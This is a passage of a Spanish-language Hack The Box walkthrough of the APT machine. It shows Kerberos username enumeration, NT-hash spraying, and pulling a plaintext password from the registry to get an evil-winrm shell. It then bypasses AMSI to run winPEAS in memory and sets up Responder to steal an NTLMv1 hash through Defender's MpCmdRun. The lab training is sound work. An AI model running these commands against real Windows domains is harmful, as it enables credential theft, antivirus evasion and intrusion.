<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">--dc</span> apt <span class="nt">-d</span> htb.local <span class="nb">users

    </span>__             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 03/31/24 - Ronnie Flathers @ropnop

2024/03/31 20:13:04 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/03/31 20:13:04 <span class="o">&gt;</span>  	apt:88

2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 APT<span class="nv">$@</span>htb.local
2024/03/31 20:13:09 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@htb.local
2024/03/31 20:17:08 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 henry.vinson@htb.local
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno tenemos un usuario valido que se llama <strong>henry.vinson</strong>.</p>
  </li>
  <li>
    <p>Si probamos obtener un TGT para el usuario que tenemos no funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> user_valid.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User henry.vinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que vamos hacer ahora es fuerza bruta para ver si de los hashes que tenemos alguno le corresponde al usuario.</p>
  </li>
  <li>
    <p>Pero hemos sido baneados.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> hashes
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:72791983d95870c0d6dd999e4389b211 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:9ea25adafeec63e38cef4259d3b15c30 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:3ae49ec5e6fed82ceea0dc2be77750ab STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:531c98e26cfa3caee2174af495031187 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:fde29e6cb61b4f7fda1ad5cd2759329d STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:51d368765462e9c5aebc456946d8dc86 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:273c48fb014f8e5bf9e2918e3bf7bfbd STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:98590500f99a1bee7559e97ad342d995 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:10cf01167854082e180cf549f63c0285 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:813f9d0988b9242eec1e45907344b591 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] htb.local<span class="se">\h</span>enry.vinson:6149000a4f3f7c57642cbee1ea70c3e1 STATUS_LOGON_FAILURE
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
^C

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Shutting down, please wait...
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
</code></pre></div></div>

<h2 id="shell-as-henry_vinson_adm">Shell as henry_vinson_adm</h2>

<ul>
  <li>No podemos aplicar fuerza bruta por <strong>smb</strong> pero si por <code class="language-plaintext highlighter-rouge">kerberos</code> <a href="https://github.com/0xAnomaly/KerbSpray">https://github.com/0xAnomaly/KerbSpray</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  KerbSpray git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 KerbSpray.py htb.local henry.vinson apt.local.htb hashes
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Spraying Hashes...

<span class="o">[</span>i] Domain:             htb.local
<span class="o">[</span>i] Target User:        henry.vinson
<span class="o">[</span>i] Domain Controller:  apt.local.htb
<span class="o">[</span>+] Success htb.local/henry.vinson
<span class="o">[</span>+] Hash Found: e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div></div>

<ul>
  <li>Ahora que tenemos el <strong>hash</strong> podemos comprobar si es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson'</span> <span class="nt">-H</span> <span class="s1">'e53d87d42adaa3ca32bdb34a876cbffb'</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos credenciales validas podemos intentar un <code class="language-plaintext highlighter-rouge">Kerberoasting attack</code> para solicitar tickets TGS <a href="https://ciberseguridad.com/amenzas/ataques-kerberoasting/">https://ciberseguridad.com/amenzas/ataques-kerberoasting/</a>.</p>
  </li>
  <li>
    <p>Pero bueno no tuvimos éxito.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers  htb.local/henry.vinson <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!
</code></pre></div></div>

<ul>
  <li>Podemos listar registros de la maquina <a href="https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.">https://threat.media/definition/what-is-a-registry-hive/#:~:text=A%20registry%20hive%20is%20a,logs%20in%20to%20a%20computer.</a> para esto podemos usar la herramienta de <code class="language-plaintext highlighter-rouge">impacket-reg</code> le tenemos que proporcionar un <strong>KeyName</strong> <a href="https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html">https://www.herongyang.com/Windows/Registry-Hives-HKCR-HKCU-HKLM-HKU-HKCC-HCPD.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU<span class="se">\C</span>onsole
HKU<span class="se">\C</span>ontrol Panel
HKU<span class="se">\E</span>nvironment
HKU<span class="se">\K</span>eyboard Layout
HKU<span class="se">\N</span>etwork
HKU<span class="se">\S</span>oftware
HKU<span class="se">\S</span>ystem
HKU<span class="se">\V</span>olatile Environment
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver lo que hay en <code class="language-plaintext highlighter-rouge">Software</code>.</p>
  </li>
  <li>
    <p>Si miramos vemos que hay un <code class="language-plaintext highlighter-rouge">GiganticHostingManagementSystem</code> y la pagina web de la maquina se llama GiganticHosting.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class="se">\S</span>oftware
HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
HKU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft
HKU<span class="se">\S</span>oftware<span class="se">\P</span>olicies
HKU<span class="se">\S</span>oftware<span class="se">\R</span>egisteredApplications
HKU<span class="se">\S</span>oftware<span class="se">\S</span>ysinternals
HKU<span class="se">\S</span>oftware<span class="se">\V</span>Mware, Inc.
HKU<span class="se">\S</span>oftware<span class="se">\W</span>ow6432Node
HKU<span class="se">\S</span>oftware<span class="se">\C</span>lasses
</code></pre></div></div>

<ul>
  <li>Si vemos lo que hay encontramos un usuario nuevo y su contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-reg htb.local/henry.vinson@apt <span class="nt">-hashes</span> :e53d87d42adaa3ca32bdb34a876cbffb query <span class="nt">-keyName</span> <span class="s1">'HKU\Software\GiganticHostingManagementSystem'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[!]</span> Cannot check RemoteRegistry status. Hoping it is started...
HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
</code></pre></div></div>

<ul>
  <li>Ahora podemos validas las credenciales para ver si son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb dead:beef::b885:d62a:d679:573f <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht
</code></pre></div></div>

<ul>
  <li>Algo que podemos hacer es ver si el usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> para conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm htb.local <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span>
SMB         apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
HTTP        apt             5985   APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://apt:5985/wsman
WINRM       apt             5985   APT              <span class="o">[</span>+] htb.local<span class="se">\h</span>enry.vinson_adm:G1#Ny5@2dvht <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> apt.local.htb <span class="nt">-u</span> <span class="s1">'henry.vinson_adm'</span> <span class="nt">-p</span> G1#Ny5@2dvht

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\h</span>enry.vinson_adm
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>         4/1/2024   6:29 PM             34 user.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
d559647d74b6b9fe38018220d86e0a7e
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>
    <p>Después de enumerar no encontré mucho así que vamos a usar una herramienta famosa de reconocimiento <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f">https://github.com/carlospolop/PEASS-ng/releases/tag/20240331-d41b024f</a>.</p>
  </li>
  <li>
    <p>Pero bueno si lo ejecutamos vemos que el <strong>antivirus</strong> lo detecta y no se puede ejecuta por eso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; upload winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/APT/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; .<span class="se">\W</span>inPEASx64.exe
Program <span class="s1">'winPEASx64.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .<span class="se">\W</span>inPEASx64.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .<span class="se">\W</span>inPEASx64.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Pero podemos hacer un <strong>Bypass</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; menu


   ,.   <span class="o">(</span>   <span class="nb">.</span>      <span class="o">)</span>               <span class="s2">"            ,.   (   .      )       .
  ("</span>  <span class="o">(</span>  <span class="o">)</span>  <span class="o">)</span><span class="s1">'     ,'</span>             <span class="o">(</span><span class="sb">`</span>     <span class="s1">'`    ("     )  )'</span>     ,<span class="s1">'   .  ,)
.; )  '</span> <span class="o">((</span> <span class="o">(</span><span class="s2">" )    ;(,      .     ;)  "</span>  <span class="o">)</span><span class="s2">"  .; )  ' (( ("</span> <span class="o">)</span>   <span class="o">)</span><span class="p">;</span><span class="o">(</span>,   <span class="o">)((</span>
_<span class="s2">".,_,.__).,) (.._( ._),     )  , (._..( '.._"</span>._, <span class="nb">.</span> <span class="s1">'._)_(..,_(_".) _( _'</span><span class="o">)</span>
<span class="se">\_</span>   _____/__  _|__|  |    <span class="o">((</span>  <span class="o">(</span>  /  <span class="se">\ </span>   /  <span class="se">\_</span>_| ____<span class="se">\_</span>_____   <span class="se">\ </span> /     <span class="se">\</span>
 |    __<span class="o">)</span>_<span class="se">\ </span> <span class="se">\/</span> /  |  |    <span class="p">;</span>_<span class="o">)</span>_<span class="s1">') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
</span></code></pre></div></div>

<ul>
  <li>Primero vamos a ejecutar el <code class="language-plaintext highlighter-rouge">Bypass-4MSI</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Bypass-4MSI

Info: Patching 4MSI, please be patient...

<span class="o">[</span>+] Success!
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora usamos el <code class="language-plaintext highlighter-rouge">Invoke-Binary</code> para que desde nuestro equipo se ejecute indicándole la ruta y lo estaríamos inyectando en memoria.</p>
  </li>
  <li>
    <p>Una vez que termine nos reportara todo el <code class="language-plaintext highlighter-rouge">output</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; Invoke-Binary /home/miguel/Hackthebox/APT/content/winPEASx64.exe
</code></pre></div></div>

<ul>
  <li>Lo mas interesante es esto vemos que soporta <code class="language-plaintext highlighter-rouge">NTLMv1</code> y es criptografía débil.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    : 2 <span class="o">(</span>Send NTLM response only<span class="o">)</span>


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : Negotiate signing <span class="o">(</span>Negotiate signing<span class="o">)</span>

  Session Security
      NTLMMinClientSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>
        <span class="o">[!]</span> NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 <span class="o">(</span>Require 128-bit encryption<span class="o">)</span>

        <span class="o">[!]</span> NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     :  <span class="o">(</span>Not defined<span class="o">)</span>
      OutboundRestrictions    :  <span class="o">(</span>Not defined<span class="o">)</span>
      InboundAuditing         :  <span class="o">(</span>Not defined<span class="o">)</span>
      OutboundExceptions      :
</code></pre></div></div>

<ul>
  <li>
    <p>Algo que podemos hacer es robar el hash <strong>NTLMv1</strong> con el <code class="language-plaintext highlighter-rouge">responder</code> <a href="https://crack.sh/netntlm/">https://crack.sh/netntlm/</a>.</p>
  </li>
  <li>
    <p>Primeramente necesitamos especificar el <strong>challenge</strong> en el archivo <code class="language-plaintext highlighter-rouge">/usr/share/responder/Responder.conf</code> .</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> Custom challenge.
<span class="p">;</span> Use <span class="s2">"Random"</span> <span class="k">for </span>generating a random challenge <span class="k">for </span>each requests <span class="o">(</span>Default<span class="o">)</span>
<span class="c">#Challenge = Random</span>
Challenge <span class="o">=</span> 1122334455667788
<span class="p">;</span> SQLite Database file
<span class="p">;</span> Delete this file to re-capture previously captured hashes
Database <span class="o">=</span> Responder.db
</code></pre></div></div>

<ul>
  <li>Ahora desplegamos el <code class="language-plaintext highlighter-rouge">responder</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>ON]
    Force ESS downgrade        <span class="o">[</span>ON]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.222]
    Responder IPv6             <span class="o">[</span>dead:beef:2::10dc]
    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-X53SCZ99DLB]
    Responder Domain Name      [GU17.LOCAL]
    Responder DCE-RPC Port     [47394]

[+] Listening for events...
</span></code></pre></div></div>

<ul>
  <li>Algo que podemos hacer para hacer la autenticación como el <code class="language-plaintext highlighter-rouge">defender</code> esta habilitado podemos hacer que haga un escaneo de un recurso compartido a nivel de red atreves del <code class="language-plaintext highlighter-rouge">MpCmdRun.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       11/21/2016   1:53 AM                en-US
d-----        9/24/2020   9:15 AM                platform
<span class="nt">-a----</span>        7/16/2016   2:12 PM           9398 AmMonitoringInstall.mof
<span class="nt">-a----</span>         1/7/2021  10:55 PM         188928 AMMonitoringProvider.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM          21004 AmStatusInstall.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM           2460 ClientWMIInstall.mof
<span class="nt">-a----</span>         1/7/2021  10:55 PM         306176 ConfigSecurityPolicy.exe
<span class="nt">-a----</span>        3/28/2017   6:23 AM         224256 DataLayer.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM        1514688 DbgHelp.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM         724480 EppManifest.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM            361 FepUnregister.mof
<span class="nt">-a----</span>         3/4/2021   5:03 AM          86528 MpAsDesc.dll
<span class="nt">-a----</span>         1/7/2021  10:39 PM        2630656 MpAzSubmit.dll
<span class="nt">-a----</span>         3/4/2021   4:55 AM         928768 MpClient.dll
<span class="nt">-a----</span>         3/4/2021   5:42 AM         377648 MpCmdRun.exe
<span class="nt">-a----</span>         3/4/2021   4:58 AM         335360 MpCommu.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM         113152 MpEvMsg.dll
<span class="nt">-a----</span>         3/4/2021   5:01 AM         101888 MpOAV.dll
<span class="nt">-a----</span>         1/7/2021  10:55 PM         178176 MpProvider.dll
<span class="nt">-a----</span>         3/4/2021   4:57 AM         526336 MpRtp.dll
<span class="nt">-a----</span>         3/4/2021   4:55 AM        2000384 MpSvc.dll
<span class="nt">-a----</span>         3/4/2021   5:02 AM          76288 MsMpCom.dll
<span class="nt">-a----</span>         3/4/2021   5:42 AM          97184 MsMpEng.exe
<span class="nt">-a----</span>         3/4/2021   5:05 AM           4608 MsMpLics.dll
<span class="nt">-a----</span>         3/4/2021   5:03 AM          53248 NisLog.dll
<span class="nt">-a----</span>         3/4/2021   5:48 AM         339400 NisSrv.exe
<span class="nt">-a----</span>         3/4/2021   5:03 AM          66048 NisWfp.dll
<span class="nt">-a----</span>        4/28/2017  12:52 AM         551424 ProtectionManagement.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM          57424 ProtectionManagement.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM           2570 ProtectionManagement_Uninstall.mof
<span class="nt">-a----</span>        7/16/2016   2:12 PM         156864 SymSrv.dll
<span class="nt">-a----</span>        7/16/2016   2:12 PM              1 SymSrv.yes
<span class="nt">-a----</span>        7/16/2016   2:12 PM           1091 ThirdPartyNotices.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt;
</code></pre></div></div>

<ul>
  <li>Con esto vamos a escanear un archivo de un recurso compartido a nivel de red de nosotros que no es obligatorio que exista solo es para hacer la autenticación y robar el <code class="language-plaintext highlighter-rouge">hash</code>.</li>
</ul>

